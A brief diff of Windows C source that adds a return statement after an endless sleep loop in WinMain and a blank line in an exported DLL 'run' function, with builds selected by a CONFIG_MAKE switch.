@@ -30,6 +30,8 @@ INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
         Sleep( Instance.Config.Sleeping * 1000 );
 
     } while ( TRUE );
+
+    return 0;
 }
 
 #elif CONFIG_MAKE == 1
@@ -72,6 +74,7 @@ __declspec(dllexport) VOID run(){
         Sleep(Instance.Config.Sleeping * 1000);
 
     } while (TRUE);
+
 }
 #endif
 
